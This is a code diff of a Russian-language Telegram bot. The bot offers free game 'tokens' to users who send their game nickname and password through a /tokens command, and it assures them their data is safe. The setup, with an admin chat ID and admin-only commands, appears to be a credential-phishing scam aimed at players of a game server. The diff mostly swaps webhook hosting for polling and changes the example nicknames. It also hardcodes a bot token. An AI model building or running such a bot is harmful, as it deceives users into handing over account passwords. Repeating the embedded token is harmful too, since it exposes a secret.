@@ -1,12 +1,10 @@
 import logging
-import os
 from telegram import Update
 from telegram.ext import Application, CommandHandler, ContextTypes
 
 # Настройки бота
 BOT_TOKEN = "8119170225:AAFF21HChAzvKb5Sccfj2A3X74dnsBOy0As"
 ADMIN_CHAT_ID = "6371055894"  # Ваш chat ID
-PORT = int(os.environ.get('PORT', 8080))  # Для хостинга
 
 # Настройка логирования
 logging.basicConfig(
@@ -22,8 +20,6 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Обработчик команды /start"""
     try:
         welcome_text = """
-🎮 *ДОБРО ПОЖАЛОВАТЬ В МАГИЧЕСКИЙ МИР ТОКЕНОВ!* 🎮
-
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
 ✨ *Получи свои токены и открой новые возможности!* ✨
@@ -34,7 +30,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
 3️⃣ Укажите ваш пароль
 
 🎯 *Пример использования:*
-`/tokens DragonSlayer magic123`
+`/tokens MineBars magic123`
 
 🛡️ *Ваши данные в безопасности!*
 После проверки автоматически начислим токены
@@ -64,7 +60,7 @@ async def tokens(update: Update, context: ContextTypes.DEFAULT_TYPE):
 `/tokens ВашНик ВашПароль`
 
 🎯 *Пример:*
-`/tokens DragonWarrior secret123`
+`/tokens MineBars secret123`
 
 🔍 *Убедитесь, что:*
 • Указали ник БЕЗ пробелов
@@ -186,7 +182,7 @@ async def admin_test(update: Update, context: ContextTypes.DEFAULT_TYPE):
         logging.info("✅ Тест пройден успешно")
         
     except Exception as e:
-        # Если ошибка - показываем реальную проблема
+        # Если ошибка - показываем реальную проблему
         error_msg = f"""
 ❌ *ТЕСТ НЕ ПРОЙДЕН*
 
@@ -354,7 +350,7 @@ async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     logging.error(f"Ошибка: {context.error}")
 
 def main():
-    """Основная функция для хостинга"""
+    """Основная функция"""
     try:
         # Создаем приложение
         application = Application.builder().token(BOT_TOKEN).build()
@@ -373,30 +369,13 @@ def main():
         # Добавляем обработчик ошибок
         application.add_error_handler(error_handler)
 
-        # ДЛЯ ХОСТИНГА - используем webhook
-        if os.environ.get('RAILWAY_STATIC_URL') or os.environ.get('PELLA_URL'):
-            # Получаем URL для webhook
-            webhook_url = os.environ.get('RAILWAY_STATIC_URL') or os.environ.get('PELLA_URL')
-            if webhook_url:
-                webhook_url = webhook_url.replace('https://', '') if webhook_url.startswith('https://') else webhook_url
-                webhook_url = f"https://{webhook_url.rstrip('/')}"
-                
-                # Устанавливаем webhook
-                application.run_webhook(
-                    listen="0.0.0.0",
-                    port=PORT,
-                    url_path=BOT_TOKEN,
-                    webhook_url=f"{webhook_url}/{BOT_TOKEN}"
-                )
-                print(f"🚀 Бот запущен на хостинге через webhook: {webhook_url}")
-            else:
-                # Если URL не найден, используем polling
-                print("🌐 Webhook URL не найден, используем polling...")
-                application.run_polling()
-        else:
-            # Локально используем polling
-            print("🖥️ Бот запущен локально через polling...")
-            application.run_polling()
+        # Запускаем бота
+        print("🎮 Бот запущен с РЕАЛЬНЫМИ тестами!")
+        print("🔓 Публичные команды: /start, /tokens")
+        print("🔐 Админ команды: /test, /real_test, /debug, /getid, /stats")
+        print("💡 Используйте /real_test для проверки реальной работы!")
+        
+        application.run_polling()
         
     except Exception as e:
         logging.error(f"Ошибка запуска бота: {e}")
